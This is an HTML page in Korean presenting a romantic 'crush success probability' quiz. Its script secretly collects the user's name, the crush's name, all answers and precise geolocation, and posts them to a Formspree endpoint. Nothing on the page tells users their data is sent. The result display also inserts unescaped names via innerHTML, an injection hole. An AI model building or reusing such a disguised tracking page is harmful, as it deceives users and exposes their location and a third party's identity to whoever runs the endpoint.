<!doctype html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <title>짝사랑 성공 확률 테스트 💘</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #fff0f5;
      text-align: center;
      padding: 24px;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 12px;
      display: inline-block;
      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
      max-width: 520px;
      width: 100%;
      text-align: left;
    }
    h1 { color: #ff69b4; text-align: center; margin: 0 0 12px; }
    label { display: block; margin: 10px 0 6px; }
    .question { margin-top: 14px; }
    .question label input { margin-right: 8px; }
    input[type="text"] {
      padding: 8px;
      width: calc(100% - 18px);
      border-radius: 6px;
      border: 1px solid #ccc;
      box-sizing: border-box;
    }
    button {
      margin-top: 18px;
      padding: 12px;
      border: none;
      border-radius: 10px;
      background: #ff69b4;
      color: white;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
    }
    #status { margin-top:8px; font-size:13px; color:#666; text-align:center; min-height:18px; }
    #result { margin-top:16px; font-size:18px; font-weight:600; text-align:center; color:#333; }
    a.map-link { display:inline-block; margin-top:8px; color:#ff4a96; text-decoration:none; }
    a.map-link:hover { text-decoration:underline; }
  </style>
</head>
<body>
  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>

  <form id="loveForm">
    <label>당신의 이름:</label>
    <input type="text" id="yourName" required>
    <label>짝사랑 상대 이름:</label>
    <input type="text" id="crushName" required>

    <!-- 질문 1~10 -->
    <div class="question">
      <label>1️⃣ 상대방과 얼마나 자주 대화하나요?</label>
      <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
      <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
      <label><input type="radio" name="q1" value="70"> 자주 해요</label>
      <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
    </div>
    <div class="question">
      <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
      <label><input type="radio" name="q2" value="10"> 전혀 아니요</label>
      <label><input type="radio" name="q2" value="50"> 가끔 그래요</label>
      <label><input type="radio" name="q2" value="80"> 자주 그래요</label>
      <label><input type="radio" name="q2" value="100"> 항상 그래요</label>
    </div>
    <div class="question">
      <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
      <label><input type="radio" name="q3" value="20"> 거의 무시해요 😢</label>
      <label><input type="radio" name="q3" value="50"> 답은 해줘요</label>
      <label><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
      <label><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요 💬</label>
    </div>
    <div class="question">
      <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
      <label><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
      <label><input type="radio" name="q4" value="50"> 한 명만 해요</label>
      <label><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
      <label><input type="radio" name="q4" value="100"> 자주 소통해요 💞</label>
    </div>
    <div class="question">
      <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
      <label><input type="radio" name="q5" value="10"> 전혀 아니요</label>
      <label><input type="radio" name="q5" value="40"> 약간 그런 듯?</label>
      <label><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
      <label><input type="radio" name="q5" value="100"> 확실히 관심 있어요 ❤️</label>
    </div>
    <div class="question">
      <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
      <label><input type="radio" name="q6" value="20"> 단답형이에요 😐</label>
      <label><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
      <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요 😊</label>
      <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요 💕</label>
    </div>
    <div class="question">
      <label>7️⃣ 상대가 나에게 먼저 말을 걸거나 연락한 적이 있나요?</label>
      <label><input type="radio" name="q7" value="20"> 전혀 없어요 😢</label>
      <label><input type="radio" name="q7" value="50"> 가끔 한두 번 있었어요</label>
      <label><input type="radio" name="q7" value="80"> 종종 먼저 연락해요 😊</label>
      <label><input type="radio" name="q7" value="100"> 자주 먼저 연락해요 💬</label>
    </div>
    <div class="question">
      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
      <label><input type="radio" name="q8" value="20"> 전혀요 😐</label>
      <label><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
      <label><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
      <label><input type="radio" name="q8" value="100"> 아주 세세하게 기억해요 💞</label>
    </div>
    <div class="question">
      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
      <label><input type="radio" name="q9" value="20"> 거의 안 웃어요 😶</label>
      <label><input type="radio" name="q9" value="50"> 예의상 웃어요 🙂</label>
      <label><input type="radio" name="q9" value="80"> 자주 웃어요 😄</label>
      <label><input type="radio" name="q9" value="100"> 항상 잘 웃고 반응이 좋아요 😂💗</label>
    </div>
    <div class="question">
      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
      <label><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
      <label><input type="radio" name="q10" value="50"> 한두 번 정도</label>
      <label><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
      <label><input type="radio" name="q10" value="100"> 자주 챙겨줘요 💝</label>
    </div>

    <button type="submit">결과 보기</button>
    <div id="status"></div>
  </form>

  <div id="result"></div>

  <script>
    // 위치를 Promise로 래핑 (성공/실패 모두 처리)
    function fetchLocation(timeout = 7000) {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ ok: false, reason: 'geolocation_not_supported' });
          return;
        }

        let done = false;
        const onSuccess = (pos) => {
          if (done) return;
          done = true;
          resolve({
            ok: true,
            lat: pos.coords.latitude,
            lon: pos.coords.longitude
          });
        };
        const onError = (err) => {
          if (done) return;
          done = true;
          // err.code: 1=PERMISSION_DENIED,2=POSITION_UNAVAILABLE,3=TIMEOUT
          resolve({ ok: false, reason: err.code === 1 ? 'permission_denied' : 'position_unavailable' });
        };

        navigator.geolocation.getCurrentPosition(onSuccess, onError, {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: timeout
        });

        // 안전 타임아웃: 만약 콜백이 안 불리면 강제로 resolve
        setTimeout(() => {
          if (done) return;
          done = true;
          resolve({ ok: false, reason: 'timeout' });
        }, timeout + 1000);
      });
    }

    document.getElementById('loveForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const statusEl = document.getElementById('status');
      const resultEl = document.getElementById('result');

      const yourName = document.getElementById('yourName').value.trim();
      const crushName = document.getElementById('crushName').value.trim();
      if (!yourName || !crushName) {
        statusEl.textContent = '⚠️ 이름을 모두 입력해주세요!';
        return;
      }

      // 질문 수집
      const questions = ['q1','q2','q3','q4','q5','q6','q7','q8','q9','q10'];
      let total = 0, answered = 0;
      const answers = {};
      for (const q of questions) {
        const sel = document.querySelector(`input[name="${q}"]:checked`);
        if (sel) {
          total += Number(sel.value);
          answered++;
          answers[q] = sel.parentElement.innerText.trim();
        } else {
          answers[q] = '미응답';
        }
      }
      if (answered < questions.length) {
        statusEl.textContent = '⚠️ 모든 질문에 답해주세요!';
        return;
      }

      // 계산
      const percent = Math.round(total / questions.length);
      let message = "";
      if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
      else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
      else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
      else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";

      // 위치 가져오는 동안 상태 표시
      statusEl.textContent = '📍 위치 확인 중... (허용을 요청할 수 있습니다)';
      // 위치 시도 (타임아웃 기본 7000ms)
      const loc = await fetchLocation(7000);

      // 위치 결과 처리
      let locationToSend = 'Unknown';
      let mapLink = null;
      if (loc.ok) {
        locationToSend = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
        mapLink = locationToSend;
      } else {
        // 거부 또는 기타 이유일 때 구체 메시지 대입 (Formspree에 기록용)
        if (loc.reason === 'permission_denied') locationToSend = 'User denied location';
        else if (loc.reason === 'geolocation_not_supported') locationToSend = 'Geolocation not supported';
        else if (loc.reason === 'timeout') locationToSend = 'Location request timeout';
        else locationToSend = 'Position unavailable';
      }

      // 결과 화면 표시 (항상 실행)
      resultEl.innerHTML = `
        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
        ${mapLink ? `<div><a class="map-link" href="${mapLink}" target="_blank">📍 결과를 본 위치 보기</a></div>` : ''}
      `;

      statusEl.textContent = ''; // 상태 문구 지움

      // Formspree 전송 (항상 전송)
      const payload = {
        yourName,
        crushName,
        percent,
        resultMessage: message,
        answers,
        location: locationToSend,
        timestamp: new Date().toISOString()
      };

      // 비동기 전송 (실패해도 사용자 흐름 차단하지 않음)
      fetch('https://formspree.io/f/xanegwav', {
        method: 'POST',
        headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch((err) => {
        // 전송 실패 로그(옵션) — 필요하면 result에 표시하거나 콘솔에 찍음
        console.warn('Formspree 전송 실패:', err);
      });
    });
  </script>
</body>
</html>
